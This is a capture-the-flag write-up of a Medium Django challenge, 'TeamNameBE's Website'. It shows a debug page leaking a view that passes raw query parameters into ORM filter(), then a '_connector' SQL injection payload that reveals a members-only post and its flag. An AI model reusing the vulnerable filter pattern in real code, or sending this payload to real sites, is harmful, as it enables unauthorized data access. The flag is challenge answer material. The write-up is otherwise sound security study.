---
title: "TeamNameBE's Website"

difficulty: Medium
description: "Your favorite team is back. TeamNameBE finally built a website. It's sleek and it definitely has no security issues whatsoever. None. Zero. Don't even look."
flag: "CSC{c0nn3ct0r_0rm_f1lt3r_1nj3ct10n}"
---

> *Your favorite team is back. TeamNameBE finally built a website. It's sleek and it definitely has no security issues whatsoever. None. Zero. Don't even look.*

Django blog with role-based access control. it's a site for the cscbe (real team!) "TeamNameBE" with a blog section called "War Stories."

the site has a blog at `/blog/` with a search form and category filters. registered an account at `/login/`. profile page said i was a Visitor. 13 posts total, slugs are numeric (`/blog/1/` through `/blog/13/`). hitting `/blog/13/` gave a 403.

## profile page 

the profile page had an HTML comment:

```html
<!-- TODO: implement /api/profile/?user=<id>&is_team_member=<bool> -->
```

hit `/api/profile/`. nd got hit with a 404,. tried mass assignment on registration to set `is_team_member=True`. tried POST, PUT, PATCH to `/profile/` with `is_team_member=True`. nothing rly worked so left this behind me

## leaking source via debug errors

started poking at `/blog/` with bad ORM lookups to see if i could trigger debug pages. tried `?content__year=1` and got a full Django debug page back. Django 5.2.7 with `DEBUG=True`.

the error header:

```
FieldError at /blog/
Unsupported lookup 'year' for TextField or join on the field not permitted.

Request Method: GET
Django Version:  5.2.7
Exception Type:  FieldError
Raised during:   core.views.blog_list
Python Version:  3.11.14
```

but the real prize was in the traceback. it leaked the source of `/srv/app/core/views.py`, line 41, the `blog_list` view:

```python
def blog_list(request):
    filters = request.GET.dict()
    # Security: always enforce visibility and access filters
    filters["visible"] = True
    filters["members_only"] = False
    posts = BlogPost.objects.filter(**filters).order_by("-created_at")
```

and in the local variables section of that stack frame:

```
filters = {'content__year': '1', 'members_only': False, 'visible': True}
```

so `request.GET.dict()` takes whatever query params you send and dumps them straight into `.filter(**filters)`. then it overwrites `members_only` to `False` and `visible` to `True` after. so you can inject any Django ORM lookup, but you can't set `members_only=True` since it gets clobbered.

i tried a bunch of things from there. `?title__icontains=secret` worked and filtered posts. `?id=13` returned nothing because `members_only=False` still excluded it. the hardcoded overwrite blocks any direct approach to the members-only post.

## `_connector` injection

Django's `QuerySet.filter()` internally builds `Q` objects. the `Q` node has a `connector` attribute that defaults to `AND`. in Django 5.2.7, if you pass `_connector` as a keyword argument to `filter()`, it flows through unsanitized and becomes the SQL connector between filter conditions.

Tried `?_connector=OR` first. the normal blog page shows 12 posts. with `_connector=OR`:

```
GET /blog/?_connector=OR
```

the response came back with 12 posts again. interesting but not quite right. the `OR` between `visible=True` and `members_only=False` wasn't enough to pull in the hidden post.

but `_connector` gets interpolated into the SQL as a raw string. so:

```
GET /blog/?_connector=)%20OR%201=1%20OR%20(
```

that turns the WHERE clause into something like:

```sql
SELECT * FROM blog_blogpost
WHERE (visible = true) OR 1=1 OR (members_only = false)
ORDER BY created_at DESC
```

the `OR 1=1` short-circuits everything. the response HTML now had all 13 posts. post #13 showed up at the top:

```html
<a href="/blog/13/" class="blog-card reveal" data-featured="False">
    <img src="/media/blog/all%2B4%2Bus%2Bback%2Bpseudo.png"
         alt="The Secret Writeup: How We Actually Won"
         class="blog-card-img" loading="lazy">
    <div class="blog-card-body">
        <span class="blog-badge badge-locked">🔒 Members Only</span>
        <h3>The Secret Writeup: How We Actually Won</h3>
        <p>If you&#x27;re reading this, you&#x27;ve bypassed the blog filter.
           Well played. Flag: CSC{c0nn3ct0r_0rm_f1lt3r_1nj3ct10n} ---</p>
    </div>
</a>
```
